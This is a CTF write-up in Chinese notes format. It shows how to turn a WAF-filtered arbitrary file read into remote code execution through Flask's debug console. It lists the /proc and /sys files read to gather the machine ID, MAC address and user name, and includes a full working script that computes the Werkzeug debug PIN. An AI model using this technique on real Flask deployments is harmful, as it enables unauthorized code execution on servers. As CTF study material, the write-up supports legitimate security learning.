- # 思路
	- 利用文件读取漏洞，计算flask debug pin实现RCE
	- 参考[[CTF/Flask/Debug模式RCE]]
- # WAF下的任意文件读取
  id:: 63e792d2-442c-473d-ada6-0a35a1cb5b57
	- `/view?filename=xxx`可以读取任意文件，但是waf禁止`flag`,`self`和`cgroup`这三个关键字
- # 数据收集
	- 不带参数访问`/view`，进入错误界面，看到模块地址为`/usr/local/lib/python3.8/site-packages/flask/app.py`
	- 利用 ((63e792d2-442c-473d-ada6-0a35a1cb5b57))
		- 爆破`/proc/{i}/environ`可知可以读取pid为14,17,19的环境
		- 读取`/proc/14/environ`可知用户名为`app`
		- 读取`/proc/14/cpuset`可知某个控制组为`/docker/dcddc01b2cc5deb5f183ef8a3af12770f1191c04ea53542256866fa5c5569ec3`
		- 读取`/sys/class/net/eth0/address`可知mac地址为`02:42:ac:02:05:32`
	- 最终收集到的数据如下，满足计算pin的条件
		- ```python
		  probably_public_bits = [
		      'app',
		      'flask.app',
		      'Flask',
		      '/usr/local/lib/python3.8/site-packages/flask/app.py'
		  ]
		  
		  private_bits = [
		      '2485376910642',
		      '7265fe765262551a676151a24c02b7b6dcddc01b2cc5deb5f183ef8a3af12770f1191c04ea53542256866fa5c5569ec3'# /etc/machine-id的内容+/proc/self/cgroup的结尾
		  ]
		  ```
- # 生成PIN
	- 脚本如下
		- ```python
		  import hashlib
		  from itertools import chain
		  
		  rv, num = None, None
		  
		  probably_public_bits = [
		      'app',
		      'flask.app',
		      'Flask',
		      '/usr/local/lib/python3.8/site-packages/flask/app.py'
		  ]
		  
		  private_bits = [
		      '2485376910642',# str(uuid.getnode()),  /sys/class/net/ens33/address
		      '7265fe765262551a676151a24c02b7b6dcddc01b2cc5deb5f183ef8a3af12770f1191c04ea53542256866fa5c5569ec3'# /etc/machine-id的内容+/proc/self/cgroup的结尾
		  ]
		  
		  h = hashlib.sha1()
		  for bit in chain(probably_public_bits, private_bits):
		      if not bit:
		          continue
		      if isinstance(bit, str):
		          bit = bit.encode("utf-8")
		      h.update(bit)
		  h.update(b"cookiesalt")
		  
		  cookie_name = f"__wzd{h.hexdigest()[:20]}"
		  
		  # If we need to generate a pin we salt it a bit more so that we don't
		  # end up with the same value and generate out 9 digits
		  if num is None:
		      h.update(b"pinsalt")
		      num = f"{int(h.hexdigest(), 16):09d}"[:9]
		  
		  # Format the pincode in groups of digits for easier remembering if
		  # we don't have a result yet.
		  if rv is None:
		      for group_size in 5, 4, 3:
		          if len(num) % group_size == 0:
		              rv = "-".join(
		                  num[x : x + group_size].rjust(group_size, "0")
		                  for x in range(0, len(num), group_size)
		              )
		              break
		      else:
		          rv = num
		  
		  print(rv)
		  ```
	- 使用生成的PIN控制flask后台即可
-